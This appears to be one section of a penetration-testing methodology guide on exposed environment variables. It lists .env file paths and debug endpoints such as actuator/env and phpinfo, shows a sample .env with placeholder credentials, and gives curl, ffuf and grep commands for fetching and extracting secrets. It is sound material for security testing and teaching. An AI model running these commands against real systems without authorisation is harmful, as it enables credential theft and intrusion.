# 2.3 Environment Variables Exposure

## Goal

Discover and exploit exposed environment variables containing secrets and configuration.

---

## .env File Exposure

Dotenv files often contain secrets:

```bash
# Common locations
https://target.com/.env
https://target.com/.env.local
https://target.com/.env.backup
https://target.com/config/.env
```

**Content example:**
```
DATABASE_URL=mysql://root:password@localhost:3306/mydb
REDIS_URL=redis://:secretpass@localhost:6379
API_KEY=sk_live_abc123xyz
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=super_secret_jwt_key
```

**Discovery:**
```bash
# Try common patterns
curl https://target.com/.env
curl https://target.com/.env.local
curl https://target.com/.env.production

# Fuzz for env files
ffuf -w wordlist.txt -u https://target.com/FUZZ.env
```

## Environment Variable Leakage

Debug endpoints often leak environment:

```
https://target.com/actuator/env
https://target.com/phpinfo.php (scroll to "Environment")
https://target.com/debug?action=showenv
```

**Information:**
- Database credentials
- API keys
- Cloud credentials
- Secrets
- Configuration paths

## Extracting Secrets

Once you have env vars, extract secrets:

```bash
grep -E "PASSWORD|SECRET|KEY|TOKEN|CREDENTIAL" .env
```

**Common secret names:**
- DB_PASSWORD
- API_KEY
- SECRET_KEY
- JWT_SECRET
- AWS_ACCESS_KEY_ID
- GITHUB_TOKEN
- SLACK_BOT_TOKEN
